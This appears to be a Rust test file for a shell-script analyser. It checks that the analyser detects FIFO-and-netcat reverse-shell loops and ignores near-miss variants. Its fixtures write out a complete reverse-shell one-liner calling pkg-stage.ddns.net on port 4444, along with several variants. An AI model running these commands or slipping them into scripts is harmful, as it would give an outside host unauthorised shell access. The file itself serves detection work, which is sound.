use serde_json::{Value, json};

const SOURCE: &str = "mkfifo /tmp/.x11r; sh -c 'sh </tmp/.x11r | nc pkg-stage.ddns.net 4444 >/tmp/.x11r' 2>/dev/null & disown; rm -f /tmp/.x11r 2>/dev/null\n";

fn values(source: &str) -> Value {
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("fixture.sh"))
        .open(source.as_bytes());
    parsed.values().as_json().clone()
}

fn loops(source: &str) -> Value {
    values(source)
        .pointer("/source/shell/fifo_network_loops")
        .cloned()
        .unwrap_or(Value::Null)
}

#[test]
fn binds_fifo_both_streams_and_literal_command_argument() {
    let rows = loops(SOURCE);
    assert_eq!(rows.as_array().map(Vec::len), Some(1), "{rows}");
    assert_eq!(rows[0]["fifo"], "/tmp/.x11r");
    assert_eq!(rows[0]["host"], "pkg-stage.ddns.net");
    assert_eq!(rows[0]["port"], 4444);
    assert_eq!(rows[0]["payload_offset"], 26);
    assert_eq!(rows[0]["offset"], 26);
    assert_eq!(rows[0]["shell_command_offset"], 19);
    assert_eq!(rows[0]["fifo_created_offset"], 0);
    let renamed = SOURCE
        .replace("/tmp/.x11r", "/var/tmp/other-pipe")
        .replace("pkg-stage.ddns.net", "192.0.2.9")
        .replace("4444", "2345");
    assert_eq!(loops(&renamed)[0]["port"], 2345);
    let absolute = SOURCE
        .replace("sh -c", "/bin/bash -c")
        .replace("sh <", "/bin/bash <")
        .replace("nc pkg-stage", "/usr/bin/nc pkg-stage");
    assert_eq!(loops(&absolute)[0]["network_client"], "/usr/bin/nc");
    let minimal = "mkfifo /tmp/f; sh -c \"sh </tmp/f | nc 192.0.2.1 8080 >/tmp/f\"";
    assert_eq!(loops(minimal)[0]["fifo"], "/tmp/f");
    let explicit = SOURCE.replace("sh <", "sh 0<").replace("4444 >", "4444 1>");
    assert_eq!(loops(&explicit)[0]["fifo"], "/tmp/.x11r");
}

/// Each relation is reported on its own: a loop over a FIFO the script does
/// not create, a loop written directly rather than in `sh -c`, and the
/// creations themselves, whatever else the script runs around them.
#[test]
fn relations_are_independent_of_the_statements_around_them() {
    let uncreated = loops(&SOURCE.replacen("mkfifo /tmp/.x11r", "mkfifo /tmp/other", 1));
    assert_eq!(uncreated[0]["fifo"], "/tmp/.x11r");
    assert_eq!(uncreated[0]["fifo_created_offset"], Value::Null);
    assert_eq!(
        values(&SOURCE.replacen("mkfifo /tmp/.x11r", "mkfifo /tmp/other", 1))
            .pointer("/source/shell/fifos"),
        Some(&json!([{"path": "/tmp/other", "offset": 0}]))
    );

    let surrounded = format!(
        "#!/bin/sh\nset -e\n{}",
        SOURCE.replace("& disown", "& override; disown")
    );
    assert_eq!(loops(&surrounded)[0]["host"], "pkg-stage.ddns.net");

    let direct = "mkfifo /tmp/f\nwhile true; do\n  sh </tmp/f | nc 192.0.2.1 8080 >/tmp/f\ndone\n";
    let rows = loops(direct);
    assert_eq!(rows[0]["fifo"], "/tmp/f");
    assert_eq!(rows[0]["shell_command_offset"], Value::Null);
    assert_eq!(rows[0]["payload_offset"], Value::Null);
    assert_eq!(rows[0]["fifo_created_offset"], 0);
    assert_eq!(rows[0]["offset"], json!(direct.find("sh <")));
}

#[test]
fn rejects_broken_paths_directions_non_shells_and_unrelated_commands() {
    let variants = [
        SOURCE.replace("sh </tmp/.x11r", "sh </tmp/other"),
        SOURCE.replace(">/tmp/.x11r", ">/tmp/other"),
        SOURCE.replace("sh </tmp/.x11r", "cat </tmp/.x11r"),
        SOURCE.replace("sh </tmp/.x11r", "sh 1</tmp/.x11r"),
        SOURCE.replace("sh </tmp/.x11r", "sh 0 </tmp/.x11r"),
        SOURCE.replace(">/tmp/.x11r", "2>/tmp/.x11r"),
        SOURCE.replace("sh -c", "echo -c"),
        SOURCE.replace("4444", "0"),
        SOURCE.replace("4444", "65536"),
        SOURCE.replace("pkg-stage.ddns.net", "http://example.test"),
        SOURCE.replace("pkg-stage.ddns.net", "bad-.example.test"),
        // A function named like the shell replaces the program.
        format!("sh() {{ printf '%s' \"$*\"; }}\n{SOURCE}"),
        SOURCE.replace("sh </tmp/.x11r", "sh -c ignored </tmp/.x11r"),
        SOURCE.replace("nc pkg-stage", "echo pkg-stage"),
    ];
    for variant in variants {
        assert_eq!(loops(&variant), Value::Null, "{variant}");
    }
}

#[test]
fn data_comments_and_dynamic_payloads_do_not_supply_flow() {
    for source in [
        format!("# {SOURCE}"),
        format!("printf '%s' {SOURCE:?}"),
        SOURCE.replace("pkg-stage.ddns.net", "${{HOST}}"),
        SOURCE.replace("sh </tmp/.x11r", "sh </tmp/$(choose)"),
    ] {
        assert_eq!(loops(&source), Value::Null, "{source}");
    }
}
